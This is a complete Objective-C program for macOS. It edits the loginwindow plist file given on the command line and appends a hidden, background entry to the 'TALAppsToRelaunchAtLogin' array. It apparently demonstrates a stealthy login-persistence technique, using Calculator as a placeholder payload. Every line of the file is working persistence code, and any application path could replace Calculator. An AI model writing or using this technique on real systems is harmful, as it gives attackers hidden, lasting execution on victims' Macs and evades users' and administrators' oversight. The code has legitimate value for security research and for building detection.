#include <stdio.h>

#import <Cocoa/Cocoa.h>

int main(int argc, char *argv[])
{
   if (2 > argc) {
      printf("usage: %s <path to loginwindow plist file>\n", argv[0]);
      return 1;
   }

   // load

   NSString *path = [NSString stringWithUTF8String: argv[1]];
   NSDictionary *dict = [[NSMutableDictionary alloc] initWithContentsOfFile:path];
   if (0 == dict.count) {
      printf("ERROR: unable read or parse plist at %s\n", argv[1]);
      return 2;
   }

   // create a Calculator hidden node

   NSDictionary *node = [[NSMutableDictionary alloc] init];
   [node setValue: @"com.apple.calculator"                forKey: @"BundleID"];
   [node setValue: @"/System/Applications/Calculator.app" forKey: @"Path"];
   [node setValue: [NSNumber numberWithInt:2]             forKey: @"BackgroundState"];
   [node setValue: [NSNumber numberWithInt:1]             forKey: @"Hide"];

   // append node to end of array

   NSMutableArray *a = [dict objectForKey: @"TALAppsToRelaunchAtLogin"];
   [a addObject: node];

   // overwrite file

   BOOL status = [dict writeToFile: path atomically: NO];
   if (NO == status) {
      printf("Failed to overwrite plist file\n");
      return 3;
   }

   return 0;
}
